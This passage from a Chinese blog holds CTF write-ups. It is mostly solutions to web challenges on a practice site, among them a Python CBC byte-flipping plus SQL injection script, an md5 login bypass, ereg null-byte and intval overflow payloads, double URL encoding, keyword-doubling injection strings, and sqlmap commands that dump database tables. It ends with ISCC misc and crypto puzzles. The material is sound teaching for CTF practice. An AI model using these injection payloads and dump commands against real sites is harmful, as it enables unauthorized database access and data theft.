字节反转：将指定偏移量的字符转换为新的字符</span><br><span class="line">def mycbc(value,idx,c1,c2):</span><br><span class="line">lst=list(value)</span><br><span class="line">lst[idx]=chr(ord(lst[idx])^ord(c1)^ord(c2))</span><br><span class="line">return &apos;&apos;.join(lst)</span><br><span class="line"># 提交payload，获取cookie，并将cookie 解密为iv，cipher，再使用字节反转攻击，使得sql 查询能够成功</span><br><span class="line">def pcat(payload,idx,c1,c2):</span><br><span class="line">url=r&apos;http://ctf5.shiyanbar.com/web/jiandan/index.php&apos;</span><br><span class="line">myd=&#123;&apos;id&apos;:payload&#125;</span><br><span class="line">res=requests.post(url,data=myd)</span><br><span class="line">cookies=res.headers[&apos;Set-Cookie&apos;]</span><br><span class="line">iv=re.findall(r&apos;iv=(.*?),&apos;,cookies)[0]</span><br><span class="line">cipher=re.findall(r&apos;cipher=(.*)&apos;,cookies)[0]</span><br><span class="line">iv_raw=mydecode(iv)</span><br><span class="line">cipher_raw=mydecode(cipher)  </span><br><span class="line"># 字节反转，先转换cipher，得到aes加密的密文(非base64加密后得值)，再利用异或，求出随机生成得iv</span><br><span class="line">cipher_new=myencode(mycbc(cipher_raw,idx,c1,c2))</span><br><span class="line">cookies_new=&#123;&apos;iv&apos;:iv,&apos;cipher&apos;:cipher_new&#125;</span><br><span class="line">cont=requests.get(url,cookies=cookies_new).content</span><br><span class="line">plain=b64decode(re.findall(r&quot;base64_decode\(&apos;(.*?)&apos;\)&quot;,cont)[0])</span><br><span class="line">first=&apos;a:1:&#123;s:2:&quot;id&quot;;s:&apos;</span><br><span class="line">iv_new=&apos;&apos;</span><br><span class="line">for i in range(16):</span><br><span class="line">iv_new+=chr(ord(first[i])^ord(plain[i])^ord(iv_raw[i]))</span><br><span class="line">iv_new=myencode(iv_new)</span><br><span class="line"># 得到源码生产的随机值iv 和aes 加密得cipher，并且plain 明文在cbc字节反转下可控</span><br><span class="line">cookies_new=&#123;&apos;iv&apos;:iv_new,&apos;cipher&apos;:cipher_new&#125;</span><br><span class="line">cont=requests.get(url,cookies=cookies_new).content</span><br><span class="line">print &apos;Payload:%s\n&gt;&gt; &apos; %(payload)</span><br><span class="line">print cont</span><br><span class="line">pass</span><br><span class="line"># 不断带入构造好的sql 语句，得到返回结果即可</span><br><span class="line">def foo():</span><br><span class="line">pcat(&apos;12&apos;,4,&apos;2&apos;,&apos;#&apos;)</span><br><span class="line">pcat(&apos;0 2nion select * from((select 1)a join (select 2)b join (select</span><br><span class="line">3)c);&apos;+chr(0),6,&apos;2&apos;,&apos;u&apos;)</span><br><span class="line">pcat(&apos;0 2nion select * from((select 1)a join (select group_concat(table_name) from</span><br><span class="line">information_schema.tables where table_schema regexp database())b join (select</span><br><span class="line">3)c);&apos;+chr(0),7,&apos;2&apos;,&apos;u&apos;)</span><br><span class="line">pcat(&quot;0 2nion select * from((select 1)a join (select group_concat(column_name) from</span><br><span class="line">information_schema.columns where table_name regexp &apos;you_want&apos;)b join (select</span><br><span class="line">3)c);&quot;+chr(0),7,&apos;2&apos;,&apos;u&apos;)</span><br><span class="line">pcat(&quot;0 2nion select * from((select 1)a join (select value from you_want limit 1)b join</span><br><span class="line">(select 3)c);&quot;+chr(0),6,&apos;2&apos;,&apos;u&apos;)</span><br><span class="line">pass</span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">foo()</span><br><span class="line">print &apos;ok&apos;</span><br></pre></td></tr></table></figure></p>
<h4 id="后台登录"><a href="#后台登录" class="headerlink" title="后台登录"></a>后台登录</h4><p>查看源码发现<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- $password=$_POST[&apos;password&apos;];</span><br><span class="line">	$sql = &quot;SELECT * FROM admin WHERE username = &apos;admin&apos; and password = &apos;&quot;.md5($password,true).&quot;&apos;&quot;;</span><br><span class="line">	$result=mysqli_query($link,$sql);</span><br><span class="line">		if(mysqli_num_rows($result)&gt;0)&#123;</span><br><span class="line">			echo &apos;flag is :&apos;.$flag;</span><br><span class="line">		&#125;</span><br><span class="line">		else&#123;</span><br><span class="line">			echo &apos;密码错误!&apos;;</span><br><span class="line">		&#125; --&gt;</span><br></pre></td></tr></table></figure></p>
<p>密码是经过md5哈希加密的，不懂网上查了一下，脑洞题，密码<img src="https://img-blog.csdn.net/20180324215047728" alt="image">中的ffifdyop   </p>
<h4 id="上传绕过"><a href="#上传绕过" class="headerlink" title="上传绕过"></a>上传绕过</h4><p>随便上传一个png图片<br><img src="http://wx2.sinaimg.cn/mw690/0060lm7Tly1fry43htcz8j30eu05ct9c.jpg" alt="image"><br>那上传一个PHP喃<br><img src="http://wx2.sinaimg.cn/mw690/0060lm7Tly1fry45loq5uj30k502idfv.jpg" alt="image"><br>在上传绕过里最有名的的就是00截断，那么我们就先要抓包<br><img src="http://wx3.sinaimg.cn/mw690/0060lm7Tly1fry4a9zjkjj30zc0bxwfk.jpg" alt="image">   </p>
<p><img src="http://wx4.sinaimg.cn/mw690/0060lm7Tly1fry4fmdsgwj30zv0bljt5.jpg" alt="image"></p>
<p><img src="http://wx4.sinaimg.cn/mw690/0060lm7Tly1fry4gn71u3j3121096jsx.jpg" alt="image">   </p>
<h4 id="Once-More"><a href="#Once-More" class="headerlink" title="Once More"></a>Once More</h4><p>提示：科学计数法<br>源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (isset ($_GET[&apos;password&apos;])) &#123;</span><br><span class="line">	if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&apos;password&apos;]) === FALSE)</span><br><span class="line">	&#123;</span><br><span class="line">		echo &apos;&lt;p&gt;You password must be alphanumeric&lt;/p&gt;&apos;;</span><br><span class="line">	&#125;</span><br><span class="line">	else if (strlen($_GET[&apos;password&apos;]) &lt; 8 &amp;&amp; $_GET[&apos;password&apos;] &gt; 9999999)</span><br><span class="line">	&#123;</span><br><span class="line">		if (strpos ($_GET[&apos;password&apos;], &apos;*-*&apos;) !== FALSE)</span><br><span class="line">		&#123;</span><br><span class="line">			die(&apos;Flag: &apos; . $flag);</span><br><span class="line">		&#125;</span><br><span class="line">		else</span><br><span class="line">		&#123;</span><br><span class="line">			echo(&apos;&lt;p&gt;*-* have not been found&lt;/p&gt;&apos;);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;</span><br><span class="line">		echo &apos;&lt;p&gt;Invalid password&lt;/p&gt;&apos;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>一道代码审计题，根据if语句要求，password必须大于9999999，但是长度小于8，而且还要等于<em>-</em><br>根据提示科学计数法，再利用%00截断，因为ereg函数存在NULL截断漏洞，导致了正则过滤被绕过,所以可以使用%00截断正则匹配，构造password=1e8%00<em>-</em><br>另一种方法也是利用题目中的函数遇到数字会返回NULL来绕过<br><img src="http://wx3.sinaimg.cn/mw690/0060lm7Tly1fry4s56ahaj30w108jt9v.jpg" alt="image">   </p>
<h4 id="程序逻辑问题"><a href="#程序逻辑问题" class="headerlink" title="程序逻辑问题"></a>程序逻辑问题</h4><p>查看源码发现index.txt文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">if($_POST[user] &amp;&amp; $_POST[pass]) &#123;</span><br><span class="line">	$conn = mysql_connect(&quot;********, &quot;*****&quot;, &quot;********&quot;);</span><br><span class="line">	mysql_select_db(&quot;phpformysql&quot;) or die(&quot;Could not select database&quot;);</span><br><span class="line">	if ($conn-&gt;connect_error) &#123;</span><br><span class="line">		die(&quot;Connection failed: &quot; . mysql_error($conn));</span><br><span class="line">&#125; </span><br><span class="line">$user = $_POST[user];</span><br><span class="line">$pass = md5($_POST[pass]);</span><br><span class="line"></span><br><span class="line">$sql = &quot;select pw from php where user=&apos;$user&apos;&quot;;</span><br><span class="line">$query = mysql_query($sql);</span><br><span class="line">if (!$query) &#123;</span><br><span class="line">	printf(&quot;Error: %s\n&quot;, mysql_error($conn));</span><br><span class="line">	exit();</span><br><span class="line">&#125;</span><br><span class="line">$row = mysql_fetch_array($query, MYSQL_ASSOC);</span><br><span class="line">//echo $row[&quot;pw&quot;];</span><br><span class="line">  </span><br><span class="line">  if (($row[pw]) &amp;&amp; (!strcasecmp($pass, $row[pw]))) &#123;</span><br><span class="line">	echo &quot;&lt;p&gt;Logged in! Key:************** &lt;/p&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">    echo(&quot;&lt;p&gt;Log in failure!&lt;/p&gt;&quot;);</span><br><span class="line">	</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>根据源码可以看到两处特别需要重视的地方，很明显该sql语句存在注入漏洞，但是密码栏不能通过一般的注入来绕过，但是可以发现，只要满足了（$row[pw]) &amp;&amp;(!strcasecmp($pass,$row[pw])就可以拿到flag，也就是说，我们输入的$pass与从数据库取出来的pw一致就行，我们可以控制$pass的值，但是貌似不知道数据库中pw的值，但是我们可以直接用union select ‘某一个经过md5加密后的字符串’#来自己随意设定密码，注意这里一定是经过md5加密，不然会出错。  </p>
<p>构造语句:’ and 0=1 union select ‘529CA8050A00180790CF88B63468826A’#</p>
<p>密码：hehe</p>
<p>就拿到flag了。  </p>
<h4 id="php大法"><a href="#php大法" class="headerlink" title="php大法"></a>php大法</h4><p>页面提示：index.php.txt<br>打开得到源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(eregi(&quot;hackerDJ&quot;,$_GET[id])) &#123;\\get传参的id值不能等于hackerDJ</span><br><span class="line">  echo(&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;);</span><br><span class="line">  exit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_GET[id] = urldecode($_GET[id]);\\对id值进行一次解码</span><br><span class="line">if($_GET[id] == &quot;hackerDJ&quot;)</span><br><span class="line">&#123;</span><br><span class="line">  echo &quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;;</span><br><span class="line">  echo &quot;&lt;p&gt;flag: *****************&#125; &lt;/p&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;br&gt;&lt;br&gt;</span><br><span class="line">Can you authenticate to this website?</span><br></pre></td></tr></table></figure></p>
<p>值得一提的是我们在网页输入url时已经进行了一次url解码，所以这里解码了两次得到的hackerDJ，所以我们传入的原始值应该是两次url编码后的hackerDJ<br>构造url: index.php?id=%2568ackerDJ<br>flag: DUTCTF{PHP_is_the_best_program_language}</p>
<h4 id="Forms"><a href="#Forms" class="headerlink" title="Forms"></a>Forms</h4><p>打开链接后显示：<br><img src="http://t.cn/R1HUSzY" alt="image"><br>发现只有一个输入框，什么也没有，查看源代码，发现有一个隐藏的输入框：<br><img src="http://t.cn/R1HUWvF" alt="image"><br>这时按F12，修改type=”hidden”为”text”后就能看到输入框了，其中value=0,这时候还是不知道另外一个输入框该填什么，然后试着修改了一下value的值，令value=1,再提交一下，就看到进一步的提示了：<br><img src="http://t.cn/R1HUe2a" alt="image"><br>这时复制pin值到输入框里就拿到flag  </p>
<h4 id="简单的SQL注入2"><a href="#简单的SQL注入2" class="headerlink" title="简单的SQL注入2"></a>简单的SQL注入2</h4><p>试着先输入1，再输入1’，页面报语法错误，再输入1 ‘页面出现SQLi detected!，推出空格被它过滤了<br>用SQLmap跑一下<br>sqlmap.py -u <a href="http://ctf5.shiyanbar.com/web/index_2.php?id=1" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/index_2.php?id=1</a> –tamper=space2comment –dbs<br><img src="http://wx3.sinaimg.cn/mw690/0060lm7Tly1fryaa78kycj30b4022741.jpg" alt="image"><br>sqlmap.py -u <a href="http://ctf5.shiyanbar.com/web/index_2.php?id=1" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/index_2.php?id=1</a> –tamper=space2comment –tables -D web1<br><img src="http://wx4.sinaimg.cn/mw690/0060lm7Tly1fryab0jtbaj30b601x0nc.jpg" alt="image"><br>sqlmap.py -u <a href="http://ctf5.shiyanbar.com/web/index_2.php?id=1" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/index_2.php?id=1</a> –tamper=space2comment –dump -C flag -T flag -D web1<br><img src="http://wx2.sinaimg.cn/mw690/0060lm7Tly1fryabuhti5j30a602c741.jpg" alt="image"></p>
<h4 id="简单的SQL注入3"><a href="#简单的SQL注入3" class="headerlink" title="简单的SQL注入3"></a>简单的SQL注入3</h4><p>输入1，页面显示hello，输入1’，页面报错<br>sqlmap跑起来<br>sqlmap.py -u <a href="http://ctf5.shiyanbar.com/web/index_3.php?id=1" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/index_3.php?id=1</a> –dbs<br><img src="http://wx2.sinaimg.cn/mw690/0060lm7Tly1fryafzy505j30f5023dfl.jpg" alt="image"><br>sqlmap.py -u <a href="http://ctf5.shiyanbar.com/web/index_3.php?id=1" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/index_3.php?id=1</a> –tables -D web1<br><img src="http://wx2.sinaimg.cn/mw690/0060lm7Tly1fryahgdnsjj30aw02i741.jpg" alt="image"><br>sqlmap.py -u <a href="http://ctf5.shiyanbar.com/web/index_3.php?id=1" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/index_3.php?id=1</a> –dump -C flag -T flag -D web1<br><img src="http://wx2.sinaimg.cn/mw690/0060lm7Tly1fryabuhti5j30a602c741.jpg" alt="image"></p>
<h4 id="简单的SQL注入"><a href="#简单的SQL注入" class="headerlink" title="简单的SQL注入"></a>简单的SQL注入</h4><p>这道题也是sql注入，输入1，页面显示正常，输出1’，页面报错</p>
<p>之后通过输入查表字段，发现union select 被过滤了,这是想到用两个union表示</p>
<p>重复输入union select后发现空格也被过滤了，继续用两个空格代替一个空格<br>1.查询当前数据库</p>
<p>1’  unionunion  selectselect  database()’  </p>
<p>2.查询数据库中的表</p>
<p>1’  unionunion  selectselect  table_name  fromfrom  information_schema.tables  wherewhere  ‘1’=’1  </p>
<p>3.查询字段名</p>
<p>1’ unionunion  selectselect  column_namcolumn_namee  fromfrom  information_schema.coluinformation_schema.columnsmns  wherewhere  table_name=’flag   </p>
<p>4.最后构造出1’  unionunion  selectselect  flag  fromfrom  flag  wherewhere  ‘1’=’1<br><img src="http://wx4.sinaimg.cn/mw690/0060lm7Tly1fryamkr5hwj30kp062aab.jpg" alt="image"> </p>
<h4 id="你真的会PHP吗？"><a href="#你真的会PHP吗？" class="headerlink" title="你真的会PHP吗？"></a>你真的会PHP吗？</h4><p>抓包发现提示：<br><img src="http://wx3.sinaimg.cn/mw690/0060lm7Tly1fryark9iifj30zu07jmy9.jpg" alt="image"><br>hint:6c525af4059b4fe7d8c33a.txt<br>打开发现源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$info = &quot;&quot;; </span><br><span class="line">$req = [];</span><br><span class="line">$flag=&quot;xxxxxxxxxx&quot;;</span><br><span class="line"></span><br><span class="line">ini_set(&quot;display_error&quot;, false); </span><br><span class="line">error_reporting(0); </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(!isset($_POST[&apos;number&apos;]))&#123;</span><br><span class="line">   header(&quot;hint:6c525af4059b4fe7d8c33a.txt&quot;);</span><br><span class="line"></span><br><span class="line">   die(&quot;have a fun!!&quot;); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foreach([$_POST] as $global_var) &#123; </span><br><span class="line">    foreach($global_var as $key =&gt; $value) &#123; </span><br><span class="line">        $value = trim($value); </span><br><span class="line">        is_string($value) &amp;&amp; $req[$key] = addslashes($value); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function is_palindrome_number($number) &#123; </span><br><span class="line">    $number = strval($number); </span><br><span class="line">    $i = 0; </span><br><span class="line">    $j = strlen($number) - 1; </span><br><span class="line">    while($i &lt; $j) &#123; </span><br><span class="line">        if($number[$i] !== $number[$j]) &#123; </span><br><span class="line">            return false; </span><br><span class="line">        &#125; </span><br><span class="line">        $i++; </span><br><span class="line">        $j--; </span><br><span class="line">    &#125; </span><br><span class="line">    return true; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(is_numeric($_REQUEST[&apos;number&apos;]))&#123;//这里判断的是未经trim()和addslashes()处理过的变量</span><br><span class="line">    </span><br><span class="line">   $info=&quot;sorry, you cann&apos;t input a number!&quot;;</span><br><span class="line"></span><br><span class="line">&#125;elseif($req[&apos;number&apos;]!=strval(intval($req[&apos;number&apos;])))&#123;</span><br><span class="line">      </span><br><span class="line">     $info = &quot;number must be equal to it&apos;s integer!! &quot;;  </span><br><span class="line"></span><br><span class="line">&#125;else&#123;</span><br><span class="line"></span><br><span class="line">     $value1 = intval($req[&quot;number&quot;]);</span><br><span class="line">     $value2 = intval(strrev($req[&quot;number&quot;]));  </span><br><span class="line"></span><br><span class="line">     if($value1!=$value2)&#123;</span><br><span class="line">          $info=&quot;no, this is not a palindrome number!&quot;;</span><br><span class="line">     &#125;else&#123;</span><br><span class="line">          </span><br><span class="line">          if(is_palindrome_number($req[&quot;number&quot;]))&#123;</span><br><span class="line">              $info = &quot;nice! &#123;$value1&#125; is a palindrome number!&quot;; </span><br><span class="line">          &#125;else&#123;</span><br><span class="line">             $info=$flag;</span><br><span class="line">          &#125;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo $info;</span><br></pre></td></tr></table></figure></p>
<p>POST的number需要满足以下条件：<br>1.不为空，且不能是一个数值型数字，包括小数。(由is_numeric函数判断)<br>2.不能是一个回文数。（is_palindrome_number判断）<br>3.该数的反转的整数值应该和它本身的整数值相等。<br>绕过方法：<br>1.<strong>利用intval函数溢出绕过</strong><br>$number不是数字；$number==strval(intval($number))；$number不是回文数</p>
<p>这里要看下操作系统，32位有符号数int范围-2147483648 ~ 2147483647；64位 - 9223372036854775808~9223372036854775807<br>可用payload<br>32位：2147483647%00；%002147483647；2147483647%20<br>64位：9223372036854775807%00；%009223372036854775807；9223372036854775807%20<br>%00可以放在数字前后，%20只能放在后面；这里的%00或者是%20可以将数字解释为字符串<br>2.<strong>用科学计数法构造0=0</strong><br>因为要求不能为回文数，但又要满足intval($req[“number”])=intval(strrev($req[“number”]))，所以我们采用科学计数法构造poc为number=0e-0%00，这样的话我们就可以绕过</p>

      
      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
    <div class="article-tag tagcloud">
        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/技术/">技术</a></li></ul>
    </div>

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-iscc ctf题小记(1)" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2018/05/14/iscc ctf题小记(1)/" class="article-date">
      <time datetime="2018-05-14T03:35:12.000Z" itemprop="datePublished">2018-05-14</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/05/14/iscc ctf题小记(1)/">iscc ctf题小记</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h3 id="ISCC-CTF小计（更新中）"><a href="#ISCC-CTF小计（更新中）" class="headerlink" title="ISCC CTF小计（更新中）"></a>ISCC CTF小计（更新中）</h3><p>上周经班上同学说起，才知道最近有个信息安全竞赛，题目比较基础，就尝试着做了一下，做的不多  </p>
<h4 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h4><h5 id="What-is-that？"><a href="#What-is-that？" class="headerlink" title="What is that？"></a>What is that？</h5><p>下载附件，得到一张图片<br><img src="http://wx1.sinaimg.cn/mw690/0060lm7Tly1frgy3w9yq7j30ia0ekq3d.jpg" alt="image">  </p>
<p>看到手指指向的地方想到flag可能就在图片下面，根据经验，应该是修改图片宽度隐藏了flag    </p>
<p>用winhex打开图片<br>这里就要了解一些png图片结构的一些知识了<br><a href="https://blog.csdn.net/joqian/article/details/8290389" target="_blank" rel="noopener">推荐阅读分析PNG图像结构</a> </p>
<p>找到表示图片长度宽度的十六进制码<br><img src="http://wx2.sinaimg.cn/mw690/0060lm7Tly1frfl1zjchkj30s90fewh3.jpg" alt="image">  </p>
<p>00 00 02 72 是图片的宽度<br>00 00 01 F4 是图片的长度<br>明显图片长宽并不标准，我们将长度修改为00 00 02 72，保存 得到flag<br><img src="http://wx4.sinaimg.cn/mw690/0060lm7Tly1frfl8w7fnhj30he0het94.jpg" alt="image">  </p>
<h5 id="数字密文"><a href="#数字密文" class="headerlink" title="数字密文"></a>数字密文</h5><p>题目给了一串数字<strong>69742773206561737921</strong><br>观察发现每一位都是在0到9之间，想到了十进制编码，百度搜了一下，看见了这篇文章实验吧的一道题<br><a href="https://www.cnblogs.com/ECJTUACM-873284962/p/7774803.html" target="_blank" rel="noopener">CTF—密码学入门第六题 古典密码</a><br>于是把密文改成了<br>&amp;#69&amp;#74&amp;#27&amp;#73&amp;#20&amp;#65&amp;#61&amp;#73&amp;#79&amp;#21用十进制解码发现是乱的，在想会不会是十六进制，用十六进制解码成功得到flag  </p>
<h5 id="秘密电报"><a href="#秘密电报" class="headerlink" title="秘密电报"></a>秘密电报</h5><p>压缩包解压得到<br>秘密电报：<br>知识就是力量 ABAAAABABBABAAAABABAAABAAABAAABAABAAAABAAAABA<br>知识就是力量不是培根说的吗？培根密码无误<br><img src="https://images2017.cnblogs.com/blog/1100338/201710/1100338-20171017235425162-1445912366.png" alt="image"><br><a href="https://netair.xyz/tools/%e5%9f%b9%e6%a0%b9%e5%af%86%e7%a0%81%e5%8a%a0%e5%af%86%e8%a7%a3%e5%af%86.html" target="_blank" rel="noopener">放到在线解密网站得到flag</a>  </p>
<h5 id="重重谍影"><a href="#重重谍影" class="headerlink" title="重重谍影"></a>重重谍影</h5><p>打开网页<br><img src="http://wx2.sinaimg.cn/mw690/0060lm7Tly1frfn2kss5kj31h708yjue.jpg" alt="image"><br>题目提示：刹那便是永恒。南无阿弥陀佛。想到了土豆文<br>再看看页面上的应该是base64码</p>
<p>多次解密得到一串不是base64的值（注意解码中的坑每次解码都需要将末尾的%3D，也就是“=”的url编码去掉），得到一串密文  </p>
<blockquote>
<p>U2FsdGVkX183BPnBd50ynIRM3o8YLmwHaoi8b8QvfVdFHCEwG9iwp4hJHznrl7d4%0AB5r<br>KClEyYVtx6uZFIKtCXo71fR9Mcf6b0EzejhZ4pnhnJOl+zrZVlV0T9NUA+u1z%0AiN+jkp<br>b6ERH86j7t45v4Mpe+j1gCpvaQgoKC0Oaa5kc</p>
</blockquote>
<p>刚开始不知道是什么，问了一下做出来的同学，才知道是AES加密，把%0A换成换行符，找一个在线AES解码的平台得到密文:   </p>
<p>答案就是后面这句但已加密  缽娑遠呐者若奢顛悉呐集梵提梵蒙夢怯倒耶哆般究有栗</p>
<p>是土豆文没错<br><a href="http://www.keyfc.net/bbs/tools/tudoucode.aspx" target="_blank" rel="noopener">与佛论禅</a><br><img src="http://wx1.sinaimg.cn/mw690/0060lm7Tly1frgf3wdyztj30yj0erjrx.jpg" alt="image"> </p>
<h5 id="有趣的ISCC"><a href="#有趣的ISCC" class="headerlink" title="有趣的ISCC"></a>有趣的ISCC</h5><p>又是一张图片<br><img src="http://wx4.sinaimg.cn/mw690/0060lm7Tly1frgfq4hc3ij30g40g4gnc.jpg" alt="image"><br>试了很多办法都没用，后面用winhex打开，发现文件尾部有一串Unicode编码  </p>
<blockquote>
<p>&#92;&#117;&#48;&#48;&#54;&#54;&#92;&#117;&#48;&#48;&#54;&#99;&#92;&#117;&#48;&#48;&#54;&#49;&#92;&#117;&#48;&#48;&#54;&#55;&#92;&#117;&#48;&#48;&#55;&#98;&#92;&#117;&#48;&#48;&#54;&#57;&#92;&#117;&#48;&#48;&#55;&#51;&#92;&#117;&#48;&#48;&#54;&#51;&#92;&#117;&#48;&#48;&#54;&#51;&#92;&#117;&#48;&#48;&#50;&#48;&#92;&#117;&#48;&#48;&#54;&#57;&#92;&#117;&#48;&#48;&#55;&#51;&#92;&#117;&#48;&#48;&#50;&#48;&#92;&#117;&#48;&#48;&#54;&#54;&#92;&#117;&#48;&#48;&#55;&#53;&#92;&#117;&#48;&#48;&#54;&#101;&#92;&#117;&#48;&#48;&#55;&#100;</p>
</blockquote>
<p>Unicode解码得到</p>
<blockquote>
<p>\u0066\u006c\u0061\u0067\u007b\u0069\u0073\u0063\u0063\u0020\u0069\u0073\u0020\u0066\u0075\u006e\u007d</p>
</blockquote>
<p>再转一次得到flag：flag{iscc is fun}  </p>
<h5 id="凯撒十三世"><a href="#凯撒十三世" class="headerlink" title="凯撒十三世"></a>凯撒十三世</h5><p>提示：凯撒十三世在学会使用键盘后<br>密文：ebdgc697g95w3<br>猜测是凯撒密码加键盘密码<br>打开在线<a href="https://www.ctftools.com/down/down/passwd/" target="_blank" rel="noopener">凯撒密码网站</a>   移位数应该是13<br>刚开始以为是解密，解了半天什么都没有，结果是加密。。。加密得到 roqtp697t95j3<br>键盘密码：<br>我们注意到大键盘区所有的字母上面都有其对应的数字，这个位置几乎在所有的键盘都是相同的。所以我们可以利用这一点应用单表替换的方法进行加密：<br>1 2 3 4 5 6 7 8 9 0<br>Q W E R T Y U I O P<br>A S D F G H J K L<br>Z X C V B N M  </p>
<p>我们根据上表可以得出，Q是1下面的第一个，A是1下面的第二个……以此类推，每一个字母都会有其对应的数字：</p>
